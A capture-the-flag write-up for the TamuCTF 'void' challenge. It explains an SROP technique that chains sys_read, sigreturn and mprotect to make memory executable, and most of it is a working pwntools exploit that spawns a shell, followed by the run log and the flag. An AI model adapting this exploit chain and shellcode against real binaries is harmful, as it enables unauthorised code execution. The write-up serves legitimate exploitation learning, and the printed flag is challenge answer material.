## Solution

I didn't solve this one during TamuCTF but I saw ```sky#0004```'s [solve in
Discord](https://discord.com/channels/962465945882853407/965296241846145114/965322156965761054)
and went back and relooked at the problem with the benefit of their solution.
I based my solution largely on their approach.

I had been stuck on the fact that I needed to call ```sys_mprotect``` to
enable RWX permissions. Since there was a ```syscall, ret```, I was hopeful I
might be able to ```pop sys_rt_sigreturn (0xf) into rax```, use SROP to call
```sys_mprotect```, and set the ```rdi, rsi, rdx``` registers . However, there
were no gadgets to write to rax. I made the mistake of not realizing that
```sys_read``` would return the bytes read into rax.

After figuring that out, putting the exploit together is pretty
straightforward. First make ```sys_read``` syscall to set rax=0xf. Next, use
SROP for ```sys_mprotect``` and mark the address of the shellcode as RWX.
Return in the program's entry, adjust the stack, and execute the shellcode.

```python  
from pwn import *  
import time

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]  
e = context.binary = ELF(binary)  
r = ROP(e)

gs = '''  
break *0x401018  
continue  
'''

def start():  
   if args.GDB:  
       return gdb.debug(e.path, gdbscript=gs)  
   elif args.REMOTE:  
       return remote("tamuctf.com", 443, ssl=True, sni="void")  
   else:  
       return process(e.path)

p = start()

'''0x401000: mov rax, 0; mov rdi, 0; mov rsi, rsp; mov rdx, 0x7d0; syscall;  
  rax = sys_read, rdi = fd = stdin, rsi = char* = 'rsp', rdx = len = 0x7d40
'''  
sys_read = 0x401000

'''0x401018: syscall; ret'''  
syscall_ret = 0x401018

start = 0x400020  
entry = 0x400018

'''stack_adjust + shellcode '''  
shellcode = asm('add rsp,0x68')  
shellcode += asm(shellcraft.sh())

def pause(stage):  
   print("[+] Pausing Before Sending Stage: %s" %stage)  
   if args.GDB:  
      raw_input("[+] Press [Enter] To Send")  
   else:  
      time.sleep(0.1)

def srop_mprotect():  
   chain = p64(sys_read)  
   chain += p64(syscall_ret)

   '''sys_mprotect(rdi=start,rsi=len(shellcode),rdx=prot=RWX)'''  
   frame = SigreturnFrame()  
   frame.rip = syscall_ret  
   frame.rsp = entry  
   frame.rax = constants.SYS_mprotect  
   frame.rdi = e.address  
   frame.rsi = len(shellcode)  
   frame.rdx = 7

   p.send(chain + bytes(frame))

def read_15_bytes():  
   pause("Reading 15 Bytes (rax=0xf=sys_rt_sigreturn) ")  
   chain=p64(syscall_ret).ljust(constants.SYS_rt_sigreturn)  
   p.send(chain)

def exec_shellcode():  
   pause("Shellcode")  
   p.send(p64(start) + shellcode)

srop_mprotect()  
read_15_bytes()  
exec_shellcode()

p.interactive()  
```

Running the exploit returns the flag

```  
python3 pwn-void.py BIN=./void REMOTE  
[*] '/root/workspace/tamu-ctf/void/void'  
   Arch:     amd64-64-little  
   RELRO:    No RELRO  
   Stack:    No canary found  
   NX:       NX enabled  
   PIE:      No PIE (0x400000)  
[*] Loaded 2 cached gadgets for './void'  
[+] Opening connection to tamuctf.com on port 443: Done  
[+] Pausing Before Sending Stage: Reading 15 Bytes (rax=0xf=sys_rt_sigreturn)  
[+] Pausing Before Sending Stage: Shellcode  
[*] Switching to interactive mode  
$ cat flag.txt  
gigem{1_6u355_7h475_h0w_w3_3xpl017_17}  
``